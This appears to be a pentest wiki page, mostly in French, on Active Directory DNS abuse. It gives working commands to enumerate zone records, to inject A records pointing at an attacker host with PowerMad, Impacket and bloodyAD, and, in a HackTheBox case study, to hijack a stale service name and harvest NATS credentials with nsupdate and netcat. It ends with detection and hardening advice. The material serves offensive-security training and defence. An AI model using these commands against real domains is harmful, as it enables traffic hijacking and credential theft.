# Enregistrements DNS AD

{{#include ../../banners/hacktricks-training.md}}

Par défaut, **tout utilisateur** dans Active Directory peut **énumérer tous les enregistrements DNS** dans les zones DNS du domaine ou de la forêt, similaire à un transfert de zone (les utilisateurs peuvent lister les objets enfants d'une zone DNS dans un environnement Active Directory).

L'outil [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permet **l'énumération** et **l'export** de **tous les enregistrements DNS** de la zone pour des fins de recon des réseaux internes.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) ajoute une sortie JSON/Greppable (`--json`), la résolution DNS multi-thread et la prise en charge de TLS 1.2/1.3 lors de la liaison à LDAPS

Pour plus d'informations lire [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Création / modification des enregistrements (ADIDNS spoofing)

Parce que le groupe **Authenticated Users** a **Create Child** sur le DACL de la zone par défaut, tout compte de domaine (ou compte d'ordinateur) peut enregistrer des enregistrements supplémentaires. Cela peut être utilisé pour le détournement de trafic, NTLM relay coercion ou même la compromission complète du domaine.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py est fourni avec Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitives d'attaque courantes

1. **Wildcard record** – `*.<zone>` transforme le serveur DNS AD en répondeur à l'échelle de l'entreprise similaire au spoofing LLMNR/NBNS. Il peut être abusé pour capturer des hashes NTLM ou pour les relayer vers LDAP/SMB. (Nécessite que WINS-lookup soit désactivé.)
2. **WPAD hijack** – ajouter `wpad` (ou un enregistrement **NS** pointant vers un hôte attaquant pour contourner la Global-Query-Block-List) et proxyfier de façon transparente les requêtes HTTP sortantes pour récolter des identifiants. Microsoft a corrigé les contournements wildcard/DNAME (CVE-2018-8320) mais **les enregistrements NS fonctionnent toujours**.
3. **Stale entry takeover** – revendiquer l'adresse IP qui appartenait auparavant à une station de travail et l'entrée DNS associée résoudra toujours, permettant resource-based constrained delegation ou des attaques Shadow-Credentials sans toucher au DNS.
4. **DHCP → DNS spoofing** – sur un déploiement Windows DHCP+DNS par défaut, un attaquant non authentifié sur le même sous-réseau peut écraser n'importe quel enregistrement A existant (y compris les Domain Controllers) en envoyant des requêtes DHCP falsifiées qui déclenchent des mises à jour dynamiques DNS (Akamai “DDSpoof”, 2023). Cela donne un machine-in-the-middle sur Kerberos/LDAP et peut mener à une prise de contrôle complète du domaine.
5. **Certifried (CVE-2022-26923)** – changez le `dNSHostName` d'un compte machine que vous contrôlez, enregistrez un enregistrement A correspondant, puis demandez un certificat pour ce nom afin d'usurper le DC. Des outils comme **Certipy** ou **BloodyAD** automatisent entièrement le processus.

---

### Détournement interne de service via des enregistrements dynamiques obsolètes (étude de cas NATS)

Lorsque les mises à jour dynamiques restent ouvertes à tous les utilisateurs authentifiés, **un nom de service désenregistré peut être repris et pointé vers l'infrastructure de l'attaquant**. Le DC Mirage HTB exposait le nom d'hôte `nats-svc.mirage.htb` après le DNS scavenging, donc n'importe quel utilisateur peu privilégié pouvait :

1. **Confirmer que l'enregistrement est manquant** et connaître le SOA avec `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Re-créer l'enregistrement** vers une interface externe/VPN qu'ils contrôlent :
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. Les clients NATS s'attendent à voir une bannière `INFO { ... }` avant d'envoyer des credentials, donc copier une bannière légitime du broker réel suffit pour récolter les secrets:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – dans Mirage le compte NATS volé fournissait un accès à JetStream, ce qui a exposé des événements d'authentification historiques contenant des noms d'utilisateur/mots de passe AD réutilisables.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Détection & durcissement

* Refuser aux **Authenticated Users** le droit *Create all child objects* sur les zones sensibles et déléguer les mises à jour dynamiques à un compte dédié utilisé par DHCP.
* Si des mises à jour dynamiques sont nécessaires, configurer la zone en **Secure-only** et activer **Name Protection** dans DHCP afin que seul l'objet ordinateur propriétaire puisse écraser son propre enregistrement.
* Surveillez les ID d'événements DNS Server 257/252 (dynamic update), 770 (zone transfer) et les écritures LDAP vers `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquez les noms dangereux (`wpad`, `isatap`, `*`) avec un enregistrement intentionnellement bénin ou via la Global Query Block List.
* Maintenez les serveurs DNS à jour – par exemple, les bugs RCE CVE-2024-26224 et CVE-2024-26231 ont atteint **CVSS 9.8** et sont exploitables à distance contre les Domain Controllers.



## Références

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, still the de-facto reference for wildcard/WPAD attacks)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
